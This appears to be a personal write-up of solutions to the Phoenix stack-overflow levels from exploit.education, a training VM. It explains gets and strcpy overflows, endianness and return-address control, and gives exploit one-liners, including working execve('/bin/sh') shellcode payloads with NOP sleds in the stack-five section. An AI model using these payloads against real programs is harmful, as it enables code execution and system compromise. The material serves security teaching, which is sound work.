# [Phoenix](https://exploit.education/phoenix/)

- All code under the `src/*` folder is from [exploit.education](https://exploit.education)

## Usage

- Install `QEMU-system-<arch>` package
- Download the Qcow2 QEMU Image, extract the content, run the `*.sh` script to start the QEMU Image.
- Upon the boot sequence complete, login with user / user, or root / root., or `ssh user@127.0.0.1 -p 2222`
- Quote from [GETTING STARTED](https://exploit.education/phoenix/getting-started/):

> The kernel.core_pattern is set to /var/lib/coredumps/core.%e.%s.%p, so check in /var/lib/coredumps for the final levels, if exploiting over the network.
> Files to be exploited reside in /opt/phoenix/<architecture> (e.g. amd64, i486, arm64, amd, etc)
> SUID files won’t create a core dump, so make a copy of the files as needed for exploit development purposes.

### Other issues

- [GDB/GEF ENCODING ERROR](https://github.com/hugsy/gef/issues/195)

```sh
export LC_CTYPE=C.UTF-8
```


## STACK_ZERO (Overwrite the next stack variable; gets())

- [STACK_ZERO-SRC](./src/stack-zero.c)

- Explain && Solution:

```sh
# ------------------------------------SRC-----------------------------------------
# struct {
#   char buffer[64];
#   volatile int changeme;
# } locals;
# ...
# gets(locals.buffer);
# ...
# if (locals.changeme != 0) {
# ...
# ------------------------------------EXPLAIN-------------------------------------
# - man 3 gets:
#
# SYNOPSIS
#        #include <stdio.h>
#
#        char *gets(char *s);
#
# gets() reads a line from stdin into the buffer pointed to by s until either
# a terminating newline or EOF, which it replaces with a null byte ('\0').
# ------------------------------------SOLUTION------------------------------------
# Input 64+ chars to overwrite the next stack variable.
python3 -c 'print("A" * 65 + "\n")' | ./stack-zero
```

![stack_zero-poc](./img/stack-zero-poc.png)


## STACK_ONE (Endianess. strcpy())

- [STACK_ONE-SRC](./src/stack-one.c)

- Explain && Solution:

```sh
# ------------------------------------SRC-----------------------------------------
# struct {
#   char buffer[64];
#   volatile int changeme;
# } locals;
# ...
# strcpy(locals.buffer, argv[1]);
# ...
# if (locals.changeme == 0x496c5962) {
# ...
# ------------------------------------EXPLAIN-------------------------------------
# - BIG ENDIAN
# - man 3 strcpy:
#
# SYNOPSIS
#      #include <string.h>
#
#      char *strcpy(char *dest, const char *src);
#
#      char *strncpy(char *dest, const char *src, size_t n);
#
# ------------------------------------SOLUTION------------------------------------
# Input 64 char + string in BIG ENDIAN to overwrite
./stack-one $(python3 -c 'print("A" * 64 + "\x62\x59\x6c\x49")')
```

![stack_one-poc](./img/stack-one-poc.png)


## STACK_TWO (Use an environment variable; strcpy())

- [STACK_TWO-SRC](./src/stack-two.c)

- Explain && Solution:

```sh
# ------------------------------------SRC-----------------------------------------
# struct {
#   char buffer[64];
#   volatile int changeme;
# } locals;
# ...
# ptr = getenv("ExploitEducation");
# ...
# strcpy(locals.buffer, ptr);
# ...
# if (locals.changeme == 0x0d0a090a) {
# ...
# ------------------------------------EXPLAIN-------------------------------------
# - man 3 getenv
# ------------------------------------SOLUTION------------------------------------
# Need the `export` to work.
export ExploitEducation=$(python3 -c 'print("A" * 64 + "\x0a\x09\x0a\x0d")'); ./stack-two
```

![stack_two-poc](./img/stack-two-poc.png)


## STACK_THREE (Find static address; objdump; gets())

- [STACK_THREE-SRC](./src/stack-three.c)

- Explain && Solution:

```sh
# ------------------------------------SRC-----------------------------------------
# void complete_level() { ... }
# int main(int argc, char **argv) {
#   struct {
#     char buffer[64];
#     volatile int (*fp)();
#   } locals;
#   ...
#   gets(locals.buffer);
#   ...
#     locals.fp();
#   ...
#   exit(0);
# }
# ------------------------------------EXPLAIN-------------------------------------
# - man objdump
# - objdump -d stack-three
# - objdump -t stack-three
# ------------------------------------SOLUTION------------------------------------
echo -en "$(python3 -c 'print("A" * 64)')\x9d\x06\x40\x00" | ./stack-three
```

- The symbol `complete_level` is a Global(g) Function(F)

![stack-three-find_addr](./img/stack-three-find_addr.png)

![stack_three-poc](./img/stack-three-poc.png)


## STACK_FOUR (Memory layout, call, ret, rip, eip, Function Prologue, Function Epilogue)

- [STACK_FOUR-SRC](./src/stack-four.c)

- Solution:

```sh
# ------------------------------------SRC-----------------------------------------
# void complete_level() { ... }
#
# void start_level() {
#   char buffer[64];
#   void *ret;
#
#   gets(buffer);
#
#   ret = __builtin_return_address(0);
#   printf("and will be returning to %p\n", ret);
# }
#
# int main(int argc, char **argv) {
#   ...
#   start_level();
# }
# ------------------------------------SOLUTION(x86_64)------------------------------------
# r < ./input.txt
r <<< $(python3 -c '(print("A"*64 + "BBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK"))')
echo -en "$(python3 -c 'print("A"*64 + "G"*4*6)')\x1d\x06\x40\x00\x00\x00\x00\x00" | ./stack-four
```

- crash dump (`rip` == "HHHHIIII", hence simply change the "HHHHIIII" to `*complete_level` to complete):
![stack-four-crash_dump](./img/stack-four-crash_dump.png)
- The address of `complete_level`
![stack-four-find_addr](./img/stack-four-find_addr.png)
- stack_four-poc
![stack_four-poc](./img/stack-four-poc.png)

### STACK_FOUR-EXPLAIN_x86 (LINUX MEMORY MAPPING, FUNCTION PROLOGUE && FUNCTION EPILOGUE)

- Simplified x86 Layout of Physical Memory
![LINUX_MEMORY_LAYOUT_EXPLAIN](./img/linux_memory_layout_explain.png)

- To confirm, `sudo cat /proc/1/maps`, or see [Memory Mapping, Linux Kernel doc](https://linux-kernel-labs.github.io/refs/heads/master/labs/memory_mapping.html)
- More details in [Memory Mapping and DMA, LDD3-ch15](https://static.lwn.net/images/pdf/LDD3/ch15.pdf)

![LINUX_MEMORY_MAPPING](./img/linux_memory_mapping.png)


### STACK_FOUR-EXPLAIN_x86 (How do RIP or EIP change on ret)

- **The `rip` or `eip` is pushed to the stack on `call`.**
- **The `rip` or `eip` is poped from the stack on `ret`.**
- This behaviour is defined in the `call` and `ret` instructions.
- Tracing the change of `rip` in stack-four:
  + The asm (we trace the `eip` on `<main + 30>` and the next instruction):
  ![stack-four-asm](./img/stack-four-asm.png)
  + Initially, `eip` points to `<main + 30>`. When executed, the `eip` auto incremented to point to the next instruction, `<main + 35>` at `0x40068d`.
  + Then, because `<main + 30>` is a `call`, **the current `eip` is pushed to the stack**, then set to `<start_level + 0>` at `0x400635`
  + Now, as shown in the screenshot, we can peek into the topmost stack at `rsp` and see the stored `eip` value `0x40068d`.
  + This is the "return address". The address to the next insturction, after the `ret`.
  ![stack-four-eip-is-pushed-on-call](./img/stack-four-eip-is-pushed-on-call.png)

- More details about the `call` and `ret` behaviour, see [Intel® 64 and IA-32 Architectures Software Developer’s Manual](https://www.intel.com/content/www/us/en/developer/articles/technical/intel-sdm.html):
[stack-four-x86-spec-of-call-and-ret](./img/stack-four-x86-spec-of-call-and-ret.png)


## STACK_FIVE (Custom shellcode)

- [STACK_FIVE-SRC](./src/stack-five.c)

- Solution:

```sh
# ------------------------------------SRC-----------------------------------------
# char *gets(char *);
#
# void start_level() {
#   char buffer[128];
#   gets(buffer);
# }
#
# int main(int argc, char **argv) {
#   ...
#   start_level();
# }
# ------------------------------------SOLUTION(x86)------------------------------------
# r < ./input.txt
# r <<< $(python3 -c '(print("A"*128 + "BBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK"))')
# 0xf7ff8233 jmp esp
(python3 -c "import sys;eip=b'\x33\x82\xff\xf7';payload=b'\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80';sys.stdout.buffer.write(b'A'*(128+12) + eip + b'\x90'*200 + payload)";cat) | env -i /opt/phoenix/i486/stack-five
# ------------------------------------SOLUTION(x86_64)------------------------------------
# r <<< $(python3 -c '(print("A"*(128+8) + "DDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK"))')
(python3 -c "import sys;eip=b'\xd7\xc4\xd8\xf7\xff\x7f';payload=b'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x54\x5f\x48\x31\xc0\xb0\x3b\x0f\x05';sys.stdout.buffer.write(b'\x90'*(128+8-len(payload)-16) + payload + b'\x90'*16 + eip)";cat) | env -i /opt/phoenix/amd64/stack-five

r <<< $(python3 -c "import sys;eip=b'\xd7\xc4\xd8\xf7\xff\x7f';payload=b'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05';sys.stdout.buffer.write(b'\x90'*(128+8-len(payload)-16) + payload + b'\x90'*16 + eip)")

# modify the payload
r <<< $(python3 -c "import sys;eip=b'\xd7\xc4\xd8\xf7\xff\x7f';payload=b'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\x48\x31\xc0\xcc\xb0\x3b\x0f\x05';sys.stdout.buffer.write(b'\x90'*(128+8-len(payload)-16) + payload + b'\x90'*16 + eip)")
# strace contains trash
(python3 -c "import sys;eip=b'\xd7\xc4\xd8\xf7\xff\x7f';payload=b'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\x48\x31\xc0\xb0\x3b\x0f\x05\xcc';sys.stdout.buffer.write(b'\x90'*(128+8-len(payload)-16) + payload + b'\x90'*16 + eip)";cat)| env -i /opt/phoenix/amd64/stack-five
# modify the /bin//sh string (use the shr 0x8 logic)
r <<< $(python3 -c "import sys;eip=b'\xd7\xc4\xd8\xf7\xff\x7f';payload=b'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x54\x5f\x48\x31\xc0\xcc\xb0\x3b\x0f\x05';sys.stdout.buffer.write(b'\x90'*(128+8-len(payload)-16) + payload + b'\x90'*16 + eip)")
# success
(python3 -c "import sys;eip=b'\xd7\xc4\xd8\xf7\xff\x7f';payload=b'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x54\x5f\x48\x31\xc0\xb0\x3b\x0f\x05';sys.stdout.buffer.write(b'\x90'*(128+8-len(payload)-16) + payload + b'\x90'*16 + eip)";cat) | env -i /opt/phoenix/amd64/stack-five


    "\x48\x31\xd2"                                  // xor    %rdx, %rdx
    "\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"      // mov	$0x68732f6e69622f2f, %rbx
    "\x48\xc1\xeb\x08"                              // shr    $0x8, %rbx
    "\x53"                                          // push   %rbx
    "\x48\x89\xe7"                                  // mov    %rsp, %rdi
    "\x50"                                          // push   %rax
    "\x57"                                          // push   %rdi
    "\x48\x89\xe6"                                  // mov    %rsp, %rsi
    "\xb0\x3b"                                      // mov    $0x3b, %al
    "\x0f\x05";                                     // syscall

r <<< $(python3 -c "import sys;eip=b'\xd7\xc4\xd8\xf7\xff\x7f';payload=b'\xcc\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xcc\xb0\x3b\x0f\x05';sys.stdout.buffer.write(b'\x90'*(128+8-len(payload)-16) + payload + b'\x90'*16 + eip)")
(python3 -c "import sys;eip=b'\xd7\xc4\xd8\xf7\xff\x7f';payload=b'\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05';sys.stdout.buffer.write(b'\x90'*(128+8-len(payload)-16) + payload + b'\x90'*16 + eip)") | env -i /opt/phoenix/amd64/stack-five
'\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05'


# 0x7f ff f7 d8 4b 4d
# 0x7f ff f7 d8 c4 d7 jmp rax
```

- Use `checksec` to check properties of the binary. The addresses are static.
- [stack-five-checksec-x86](./img/stack-five-checksec-x86.png)
- [stack-five-poc-x86](./img/stack-five-poc-x86.png)

- [stack-five-x86_64-jmpesp](./img/stack-five-x86_64-jmpesp.png)


### STACK_FIVE-EXPLAIN_x86 (Why not shellcode before eip)

- Why not put shellcode before `eip`?
  + First, the space after the `eip` is usually larger.
  + Second, many variables (e.g. the environment variables in the current shell) could affect the stack address, as a result, the stack address is not easy to guess.
  + However, if we can find out addresses of "ROP gadget"s (e.g. `jmp esp` or `jmp eax` etc.) somehow, we can redirect the execution to our payload after the `eip`.
  + Because usually, we do know the relative position of our payloads to some registers, on `ret`. For example, if `esp` has our payload, `jmp esp`, if `eax` has our payload, `jmp eax`.


```python
#/bin/python3
import struct,sys;rsp_addr=0x00007fffffffe500;rip=struct.pack("<Q",rsp_addr);shellcode=b'\xcc';p=b'\x90'*(128+8-len(shellcode))+shellcode+rip;sys.stdout.buffer.write(p);
```


- crash dump (`rip` == "HHHHIIII", hence simply change the "HHHHIIII" to `*complete_level` to complete):
![stack-four-crash_dump](./img/stack-four-crash_dump.png)
- The address of `complete_level`
![stack-four-find_addr](./img/stack-four-find_addr.png)
- stack_four-poc
![stack_four-poc](./img/stack-four-poc.png)
